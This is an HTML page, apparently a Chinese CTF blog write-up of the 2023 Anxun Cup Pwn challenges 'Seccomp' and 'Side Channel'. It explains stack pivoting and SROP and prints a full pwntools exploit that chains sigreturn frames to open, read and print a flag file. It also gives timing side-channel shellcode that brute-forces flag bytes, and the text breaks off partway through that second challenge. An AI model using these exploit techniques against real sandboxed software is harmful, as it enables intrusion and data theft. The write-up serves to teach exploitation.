@@ -1,0 +1,541 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>2023安洵杯-Pwn | 晚栀wingee~</title>
+
+  <!-- keywords -->
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="引言： 2023第六届安洵杯网络安全挑战赛，Pwn方向部分题解。总共三题， 本文主要介绍前两题，Side Channel和Seccomp，考点包括Srop，栈迁移，侧信道攻击等。比赛时间11h还是很有限，做题的时候在一些莫名其妙的地方卡了很久，最后在学长的hint下艰难地搞出来呜呜呜...还是菜，继续练~">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2023安洵杯-Pwn">
+<meta property="og:url" content="http://47.96.29.144/2023/12/23/2023D0g3Pwn/index.html">
+<meta property="og:site_name" content="晚栀wingee~">
+<meta property="og:description" content="引言： 2023第六届安洵杯网络安全挑战赛，Pwn方向部分题解。总共三题， 本文主要介绍前两题，Side Channel和Seccomp，考点包括Srop，栈迁移，侧信道攻击等。比赛时间11h还是很有限，做题的时候在一些莫名其妙的地方卡了很久，最后在学长的hint下艰难地搞出来呜呜呜...还是菜，继续练~">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://47.96.29.144/2023/12/23/2023D0g3Pwn/image-20231223235107261.png">
+<meta property="og:image" content="http://47.96.29.144/2023/12/23/2023D0g3Pwn/image-20231223235204264.png">
+<meta property="og:image" content="http://47.96.29.144/2023/12/23/2023D0g3Pwn/image-20231223235603015.png">
+<meta property="og:image" content="http://47.96.29.144/2023/12/23/2023D0g3Pwn/image-20231223235953255.png">
+<meta property="og:image" content="http://47.96.29.144/2023/12/23/2023D0g3Pwn/image-20231223235627435.png">
+<meta property="og:image" content="http://47.96.29.144/2023/12/23/2023D0g3Pwn/image-20231224001054853.png">
+<meta property="og:image" content="http://47.96.29.144/2023/12/23/2023D0g3Pwn/image-20231224004352533.png">
+<meta property="og:image" content="http://47.96.29.144/2023/12/23/2023D0g3Pwn/image-20231224004610240.png">
+<meta property="og:image" content="http://47.96.29.144/2023/12/23/2023D0g3Pwn/image-20231224005627903.png">
+<meta property="og:image" content="http://47.96.29.144/2023/12/23/2023D0g3Pwn/image-20231224005656098.png">
+<meta property="og:image" content="http://47.96.29.144/2023/12/23/2023D0g3Pwn/image-20231224011159513.png">
+<meta property="og:image" content="http://47.96.29.144/2023/12/23/2023D0g3Pwn/image-20231224011335832.png">
+<meta property="og:image" content="http://47.96.29.144/2023/12/23/2023D0g3Pwn/480b8c26497340e703f0eb61ade26c5.png">
+<meta property="og:image" content="http://47.96.29.144/2023/12/23/2023D0g3Pwn/image-20231224013629508.png">
+<meta property="article:published_time" content="2023-12-23T15:48:21.000Z">
+<meta property="article:modified_time" content="2023-12-23T18:07:54.767Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://47.96.29.144/2023/12/23/2023D0g3Pwn/image-20231223235107261.png">
+  
+    <link rel="alternative" href="/atom.xml" title="晚栀wingee~" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/avatar.jpg">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+
+  
+<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>
+
+  
+<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+
+
+  
+<meta name="generator" content="Hexo 7.0.0"><style>mjx-container[jax="SVG"] {
+  direction: ltr;
+}
+
+mjx-container[jax="SVG"] > svg {
+  overflow: visible;
+}
+
+mjx-container[jax="SVG"][display="true"] {
+  display: block;
+  text-align: center;
+  margin: 1em 0;
+}
+
+mjx-container[jax="SVG"][justify="left"] {
+  text-align: left;
+}
+
+mjx-container[jax="SVG"][justify="right"] {
+  text-align: right;
+}
+
+g[data-mml-node="merror"] > g {
+  fill: red;
+  stroke: red;
+}
+
+g[data-mml-node="merror"] > rect[data-background] {
+  fill: yellow;
+  stroke: none;
+}
+
+g[data-mml-node="mtable"] > line[data-line] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > rect[data-frame] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > .mjx-dashed {
+  stroke-dasharray: 140;
+}
+
+g[data-mml-node="mtable"] > .mjx-dotted {
+  stroke-linecap: round;
+  stroke-dasharray: 0,140;
+}
+
+g[data-mml-node="mtable"] > svg {
+  overflow: visible;
+}
+
+[jax="SVG"] mjx-tool {
+  display: inline-block;
+  position: relative;
+  width: 0;
+  height: 0;
+}
+
+[jax="SVG"] mjx-tool > mjx-tip {
+  position: absolute;
+  top: 0;
+  left: 0;
+}
+
+mjx-tool > mjx-tip {
+  display: inline-block;
+  padding: .2em;
+  border: 1px solid #888;
+  font-size: 70%;
+  background-color: #F8F8F8;
+  color: black;
+  box-shadow: 2px 2px 5px #AAAAAA;
+}
+
+g[data-mml-node="maction"][data-toggle] {
+  cursor: pointer;
+}
+
+mjx-status {
+  display: block;
+  position: fixed;
+  left: 1em;
+  bottom: 1em;
+  min-width: 25%;
+  padding: .2em .4em;
+  border: 1px solid #888;
+  font-size: 90%;
+  background-color: #F8F8F8;
+  color: black;
+}
+
+foreignObject[data-mjx-xml] {
+  font-family: initial;
+  line-height: normal;
+  overflow: visible;
+}
+
+.MathJax path {
+  stroke-width: 3;
+}
+
+mjx-container[display="true"] {
+  overflow: auto hidden;
+}
+
+mjx-container[display="true"] + br {
+  display: none;
+}
+</style></head>
+<body>
+  <div id="container">
+    <div id="particles-js"></div>
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+				<img lazy-src="/img/avatar.jpg" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+			<h1 class="header-author"><a href="/"></a></h1>
+		</hgroup>
+
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/">Home</a></li>
+				        
+							<li><a href="/archives">Archives</a></li>
+				        
+							<li><a href="/introduction">关于我</a></li>
+				        
+							<li><a href="/pp">晚栀的书房(building)</a></li>
+				        
+							<li><a href="/log">运维日志</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="half-header-menu">
+						<a class="hide">Home</a>
+						<a>Tags</a>
+						<a>Links</a>
+						<a>About</a>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+								<a class="github" target="_blank" href="https://github.com/wing3e" title="github">github</a>
+					        
+								<a class="weibo" target="_blank" href="#" title="weibo">weibo</a>
+					        
+						</div>
+						<!-- music -->
+						
+							<!-- <div style="position: absolute; bottom: 120px; left: auto; width: 85%;"> -->
+							<div style="position: absolute; left: auto; width: 85%;">
+								<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=220 height=86 src="//music.163.com/outchain/player?type=2&id=1830685896&auto=1&height=66"></iframe>
+							</div>
+						
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						<a href="/tags/Pwn/" style="font-size: 12px;">Pwn</a> <a href="/tags/Reverse/" style="font-size: 12px;">Reverse</a> <a href="/tags/ZJUCTF/" style="font-size: 14px;">ZJUCTF</a> <a href="/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/" style="font-size: 12px;">密码学</a> <a href="/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/" style="font-size: 16px;">操作系统</a> <a href="/tags/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/" style="font-size: 18px;">数学建模</a> <a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/" style="font-size: 14px;">计算机体系结构</a> <a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/" style="font-size: 10px;">计算机系统</a> <a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9FII/" style="font-size: 20px;">计算机系统II</a>
+					</div>
+				</section>
+				
+				
+				
+				<section class="switch-part switch-part3">
+					<div id="js-friends">
+					
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://note.jiepeng.tech/">JPGG&#39;s NoteBook</a>
+			        
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://47.99.33.238/">Tauhkc&#39;s Note</a>
+			        
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://xymmsnotebook.gitbook.io/noteofxymm/">xy猫猫</a>
+			        
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://121.40.230.233:3303/">CCnocc</a>
+			        
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://hzeroyuke.github.io/my_blog/">华零的Notebook</a>
+			        
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://miraclemaster.cn/">恩浩gg</a>
+			        
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://116.62.208.33/">SLXjj没想好的标题</a>
+			        
+			        </div>
+				</section>
+				
+
+				
+				
+				<section class="switch-part switch-part4">
+				
+					<div id="js-aboutme">aaa</div>
+				</section>
+				
+			</div>
+		</div>
+	</header>				
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide"></h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img lazy-src="/img/avatar.jpg" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author"></h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">Home</a></li>
+		        
+					<li><a href="/archives">Archives</a></li>
+		        
+					<li><a href="/introduction">关于我</a></li>
+		        
+					<li><a href="/pp">晚栀的书房(building)</a></li>
+		        
+					<li><a href="/log">运维日志</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+						<a class="github" target="_blank" href="https://github.com/wing3e" title="github">github</a>
+			        
+						<a class="weibo" target="_blank" href="#" title="weibo">weibo</a>
+			        
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+      <div class="body-wrap"><article id="post-2023D0g3Pwn" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2023/12/23/2023D0g3Pwn/" class="article-date">
+  	<time datetime="2023-12-23T15:48:21.000Z" itemprop="datePublished">2023-12-23</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      2023安洵杯-Pwn
+      
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+        
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+<h3 id="引言">引言：</h3>
+<p>2023第六届安洵杯网络安全挑战赛，Pwn方向部分题解。总共三题， 本文主要介绍前两题，Side Channel和Seccomp，考点包括Srop，栈迁移，侧信道攻击等。比赛时间11h还是很有限，做题的时候在一些莫名其妙的地方卡了很久，最后在学长的hint下艰难地搞出来呜呜呜...还是菜，继续练~</p>
+<span id="more"></span>
+<p>Side Channel是Seccomp的plus版，所以先介绍Seccomp</p>
+<h3 id="seccomp">1 Seccomp</h3>
+<p>检查文件：</p>
+<p><img src="/2023/12/23/2023D0g3Pwn/image-20231223235107261.png"></p>
+<p>没有开启<code>canary</code>和<code>PIE</code>保护，检查沙箱：</p>
+<p><img src="/2023/12/23/2023D0g3Pwn/image-20231223235204264.png"></p>
+<p>从沙箱中可以看出，禁用了<code>execve</code>，允许了<code>read</code> <code>write</code> <code>open</code> 和<code>rt_sigereturn</code></p>
+<p><code>seccomp</code>沙箱的想法一般是<code>orw</code></p>
+<blockquote>
+<p>ORW（Open-Read-Write）是一种经典的漏洞利用技术，常用于利用二进制程序中的文件读取和写入操作来执行特定的操作，例如读取敏感文件或执行任意代码。</p>
+<p>在利用ORW漏洞时，主要思路是通过构造适当的系统调用参数和shellcode，将文件描述符指向目标文件并执行读取或写入操作。</p>
+</blockquote>
+<p>将程序丢进IDA，反汇编，<code>main</code>函数如下：</p>
+<p><img src="/2023/12/23/2023D0g3Pwn/image-20231223235603015.png"></p>
+<p>第一个个函数没用，直接跟进第二个：</p>
+<p><img src="/2023/12/23/2023D0g3Pwn/image-20231223235953255.png"></p>
+<p>可以看到在这里直接给程序加了沙箱。也就是说，程序在给自己加<code>seccomp</code>之前，所有系统调用都可以执行，但在这之后只能执行<code>seccomp</code>允许的调用。</p>
+<p><img src="/2023/12/23/2023D0g3Pwn/image-20231223235627435.png"></p>
+<p>果然是一堆抽象的系统调用，脑袋疼。</p>
+<ul>
+<li><code>syscall(1, 1, buf, size)</code>从<code>buf</code>中输出<code>size</code>个字符（1号系统调用，相当于write）</li>
+<li><code>syscall(0, 0, fd, size)</code>将<code>size</code>大小的字符串读入<code>fd</code>中（0号系统调用，相当于read）</li>
+</ul>
+<p>这里<code>syscall(0, 0, v1, 58LL)</code>制造了一个溢出点：v1数组只有10bytes的大小，但是输入了58bytes的数据。</p>
+<p>根据IDA的反汇编，v1数组起始地址和<code>retaddr</code>的偏移为<code>0x2A + 8 = 50</code>个bytes，也就是说虽然有溢出，但也只溢出了8个bytes，不论是ORW还是普通的ROP都是远远不够的。</p>
+<p>同时根据上一个输入<code>syscall(0,0, &amp;unk_404060, 4096)</code>我们发现可以操控内存地址<code>unk_404060</code>。于是想到<strong>栈迁移</strong></p>
+<blockquote>
+<p>栈迁移（Stack Migration）是一种常用的漏洞利用技术，用于绕过内存保护机制，以执行恶意代码或控制程序流程。在栈迁移攻击中，攻击者利用程序中的漏洞，将栈的执行流程转移到攻击者控制的内存区域，从而实现对程序的控制。</p>
+</blockquote>
+<p>其实栈迁移最根本的事情就是要把<code>rsp</code>搞到新栈上，至于<code>rbp</code>到时候只要不乱<code>pop</code>就无所谓。</p>
+<p>栈迁移的基本思路为：</p>
+<ul>
+<li>覆盖<code>rbp</code>为新栈的栈顶</li>
+<li>覆盖<code>retaddr</code>为<code>leave|ret</code>的返回地址</li>
+</ul>
+<p>在函数结尾：</p>
+<p><img src="/2023/12/23/2023D0g3Pwn/image-20231224001054853.png"></p>
+<p><code>leave</code>指令相当于执行<code>mov rsp, rbp ; pop rbp</code></p>
+<p>下面简单演示下栈迁移的过程：</p>
+<p>旧栈</p>
+<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">----------------</span><br><span class="line">|<span class="string">     *rbp     </span>|<span class="string"> ----- </span></span><br><span class="line"><span class="string">----------------     </span>|</span><br><span class="line">|<span class="string">    retaddr   </span>|<span class="string">     </span>|</span><br><span class="line">----------------     |<span class="string"></span></span><br><span class="line"><span class="string"></span>|<span class="string">     .....    </span>|<span class="string">     </span>|</span><br><span class="line">----------------     |<span class="string"></span></span><br><span class="line"><span class="string"></span>|<span class="string">    old rbp   </span>|<span class="string"> &lt;----</span></span><br></pre></td></tr></table></figure>
+<p>覆盖rbp 为新栈的栈顶（我们定义<code>unk_404060</code>下的0x1000个字节就是新栈，栈顶即<code>0x404060</code>）</p>
+<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">----------------            ---------------</span><br><span class="line">|<span class="string">   0x404060   </span>|<span class="string"> ---------&gt; </span>|<span class="string">     ...     </span>|<span class="string"> 新栈</span></span><br><span class="line"><span class="string">----------------            ---------------</span></span><br><span class="line"><span class="string"></span>|<span class="string">   leave</span>|<span class="string">ret  </span>|<span class="string">            </span>|<span class="string">             </span>|</span><br><span class="line">----------------            ---------------</span><br><span class="line">|<span class="string">     .....    </span>|<span class="string">            </span>|<span class="string">             </span>|</span><br><span class="line">----------------            ---------------</span><br><span class="line">|<span class="string">    old *rbp  </span>|<span class="string">            </span>|<span class="string">             </span>|</span><br></pre></td></tr></table></figure>
+<p>函数执行结束返回时，第一次执行函数本身的<code>leave|ret</code>(leave相当于<code>mov rsp, rbp ; pop rbp</code>)</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="built_in">rsp</span>, <span class="built_in">rbp</span> <span class="comment">; rsp = rbp</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">rbp</span> <span class="comment">; rbp = 404060 , rsp = rsp + 8 -&gt; ret_addr</span></span><br><span class="line"><span class="keyword">ret</span> <span class="comment">; rip = (leave|ret), rsp = rsp + 8 = ret_addr + 8(其实这里的rsp就随便了，反正第二个leave也会变成rbp)</span></span><br></pre></td></tr></table></figure>
+<p>第二次执行我们跳转到的<code>leave | ret</code></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">mov</span> rsp, rbp ;  rsp = rbp = <span class="number">0</span>x404060</span><br><span class="line"><span class="attribute">pop</span> rbp; rbp = *(unsigned long long)(<span class="number">0</span>x404060), rsp = rsp + <span class="number">8</span> = <span class="number">0</span>x404068</span><br><span class="line"><span class="attribute">ret</span> ; rip = *(unsigned long long)(<span class="number">0</span>x404068) rsp = <span class="number">0</span>x404070</span><br></pre></td></tr></table></figure>
+<p>这时的栈结构</p>
+<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">----------------            ---------------</span><br><span class="line">|<span class="string">   0x404060   </span>|<span class="string"> ---------&gt; </span>|<span class="string">   0x404060  </span>|<span class="string"> 新栈</span></span><br><span class="line"><span class="string">----------------            ---------------</span></span><br><span class="line"><span class="string"></span>|<span class="string">   leave</span>|<span class="string">ret  </span>|<span class="string">            </span>|<span class="string">   0x404068  </span>|<span class="string"> </span></span><br><span class="line"><span class="string">----------------            ---------------</span></span><br><span class="line"><span class="string"></span>|<span class="string">     .....    </span>|<span class="string">            </span>|<span class="string">   0x404070  </span>|<span class="string"> &lt;-- rsp</span></span><br><span class="line"><span class="string">----------------            ---------------</span></span><br><span class="line"><span class="string"></span>|<span class="string">    old *rbp  </span>|<span class="string">            </span>|<span class="string">             </span>|<span class="string"> ; 此时的rip = *(unsigned long long)(0x404068)</span></span><br></pre></td></tr></table></figure>
+<p>现在我们成功把栈迁到<code>unk_404060</code>上啦~</p>
+<p>此处的payload其实很简单，但一定要注意在第二个<code>ret</code>之后，我们的<code>rip</code>已经更改成<code>0x404046</code>中储存的第一个地址了，<strong>所以一定要从<code>0x404068</code>开始布栈</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b"A"</span> * (<span class="number">0x2a</span>) + p64(<span class="number">0x404060</span>) + p64(leave_ret)</span><br></pre></td></tr></table></figure>
+<p>到这里这道题就完成一半了。下一半比较简单，因为整个程序都是系统调用，所以也没多少<code>gadget</code>可用。注意到沙箱还允许了<code>rt_sigereturn</code>, 同时注意到程序中有这样的两个代码片段：</p>
+<p><img src="/2023/12/23/2023D0g3Pwn/image-20231224004352533.png"></p>
+<p><code>0xf</code>号系统调用，经典<code>Srop</code>。如果是正常的<code>ORW</code>那么可能会这样：</p>
+<p><img src="/2023/12/23/2023D0g3Pwn/image-20231224004610240.png"></p>
+<p>但是这道题中根本没多少<code>gadget</code>可以用，但说白了都是控寄存器，执行系统调用而已。</p>
+<p>同时我们需要给"flag"文件名和从flag中读出来的东西找一个地方存放，我这里选择新栈的前0x100个字节。所以在最终的EXP中，定义的新栈顶需要抬高了0x100，没有什么影响滴~</p>
+<p>先给出本题的EXP：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./chall"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./chall"</span>)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">flag_len = <span class="number">0x100</span></span><br><span class="line">flag_addr = <span class="number">0x404068</span> <span class="comment"># ""</span></span><br><span class="line">flag_name_addr = <span class="number">0x404060</span> <span class="comment"># 存储"flag"字符串</span></span><br><span class="line"></span><br><span class="line">sys_ret = <span class="number">0x40118A</span></span><br><span class="line"></span><br><span class="line">pop_rax = <span class="number">0x401193</span></span><br><span class="line"></span><br><span class="line">leave_ret = <span class="number">0x4014d4</span></span><br><span class="line"></span><br><span class="line">main_ret = <span class="number">0x4014A9</span></span><br><span class="line"></span><br><span class="line">shell = <span class="number">0x404060</span> + flag_len</span><br><span class="line"></span><br><span class="line">ret_addr = <span class="number">0x40118e</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b"flag"</span>.ljust(<span class="number">8</span>, <span class="string">b"\x00"</span>) + <span class="string">b"\x00"</span> * (<span class="number">0x100</span> - <span class="number">8</span>) + <span class="string">b"a"</span> * <span class="number">8</span> </span><br><span class="line"><span class="comment"># b"a" * 8 占位0x404160, 从 0x404168开始布栈</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># open flag</span></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = <span class="number">2</span></span><br><span class="line">frame.rdi = flag_name_addr</span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rip = sys_ret</span><br><span class="line">frame.rsp = shell + <span class="number">16</span> + <span class="number">8</span> + <span class="built_in">len</span>(frame) - <span class="number">8</span></span><br><span class="line"></span><br><span class="line">shell_temp = shell + <span class="number">16</span> + <span class="number">8</span> + <span class="built_in">len</span>(frame)</span><br><span class="line"></span><br><span class="line">payload += p64(pop_rax) + p64(sys_ret) + <span class="built_in">bytes</span>(frame)</span><br><span class="line"></span><br><span class="line">shell_temp += <span class="number">16</span> + <span class="built_in">len</span>(frame) <span class="comment"># 更新栈顶</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># read flag</span></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = <span class="number">0</span></span><br><span class="line">frame.rbx = <span class="number">0</span></span><br><span class="line">frame.rdi = <span class="number">3</span></span><br><span class="line">frame.rsi = flag_addr</span><br><span class="line">frame.rdx = <span class="number">0x100</span></span><br><span class="line">frame.rip = sys_ret</span><br><span class="line">frame.rsp = shell_temp - <span class="number">8</span> <span class="comment"># 恢复rsp， 防止pop rbp破坏栈结构</span></span><br><span class="line"></span><br><span class="line">payload += p64(pop_rax) + p64(sys_ret) + <span class="built_in">bytes</span>(frame)</span><br><span class="line"></span><br><span class="line">shell_temp += <span class="number">16</span> + <span class="built_in">len</span>(frame) <span class="comment"># 更新栈顶</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># write flag</span></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = <span class="number">1</span></span><br><span class="line">frame.rdi = <span class="number">1</span></span><br><span class="line">frame.rsi = flag_addr</span><br><span class="line">frame.rdx = <span class="number">0x100</span></span><br><span class="line">frame.rip = sys_ret</span><br><span class="line">frame.rsp = shell_temp - <span class="number">8</span></span><br><span class="line"></span><br><span class="line">payload += p64(pop_rax) + p64(sys_ret) + <span class="built_in">bytes</span>(frame) + p64(ret_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b"A"</span> * (<span class="number">0x2a</span>) + p64(shell) + p64(leave_ret) <span class="comment"># 栈迁移</span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p><strong>需要注意的是，为了让每次<code>sigereturn</code>结束后，<code>rsp</code>都能恢复，我们需要不断追踪<code>rsp</code>的当前位置并在<code>srop</code>中手动定义<code>rsp</code>的值。但注意到每次<code>syscall</code>后还跟着一个<code>pop rbp</code>，会把<code>rsp</code>抬高8个字节，所以我们在定义的时候要将<code>rsp - 8</code>，以便<code>ret</code>之后仍可以正确执行<code>pop</code>链。</strong></p>
+<p>在本地创造一个文件flag，内容如下：</p>
+<p><img src="/2023/12/23/2023D0g3Pwn/image-20231224005627903.png"></p>
+<p>执行exp，运行结果如下：</p>
+<p><img src="/2023/12/23/2023D0g3Pwn/image-20231224005656098.png"></p>
+<p>成功读取文件内容。</p>
+<h3 id="side-channel">Side Channel</h3>
+<p>这个题是上一道<code>seccomp</code>的plus版</p>
+<p><img src="/2023/12/23/2023D0g3Pwn/image-20231224011159513.png"></p>
+<p>好好好，把<code>write</code>也给我禁了，但允许<code>mprotect</code>和<code>srop</code>，但是他为什么还能输出字符串.....丢进IDA</p>
+<p><img src="/2023/12/23/2023D0g3Pwn/image-20231224011335832.png"></p>
+<p>代码结构和上一题基本一致，但有些不同。这里的<code>sub_40119E</code>是给程序上沙箱，<strong>也就是说在这之前一切操作都是允许的，程序可以输出字符串，但在这之后你就不能输出了。</strong></p>
+<p>好好好经典只许官差放火不许百姓点灯（）</p>
+<p>延续上一题的思路，本题的考点在<strong>侧信道攻击</strong>。</p>
+<blockquote>
+<p>侧信道攻击（Side-Channel Attacks）是一类利用计算系统在执行过程中泄露的辅助信息（侧信道）来推断出敏感数据的攻击技术。相比直接攻击计算系统的漏洞，侧信道攻击关注的是计算系统的实际执行行为和相关的物理特性，从中获取敏感信息。</p>
+</blockquote>
+<p>大体思路就是我们可以通过<code>O R</code>把<code>flag</code>读到内存里，并且通过<code>mprotect</code>将<code>unk_404060</code>下的内存页设置为可读可写可执行，在<code>unk_404060</code>下布shellcode：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov bl, byte ptr [flag_addr] ; 取flag中的一个字符到bl</span><br><span class="line">mov al, {} ; 设置al为我们定义的一个字符</span><br><span class="line">cmp bl, al</span><br><span class="line">jz $-3 ; 如果相等，则跳转到pc-3的位置即cmp，陷入死循环</span><br></pre></td></tr></table></figure>
+<p><strong>如果我们当前尝试的字符和flag中的某一个字符相等，程序将陷入死循环，否则将很快退出。根据这个来爆破flag</strong></p>
+<p>其中<code>mprotect</code>的系统调用要通过<code>Srop</code></p>
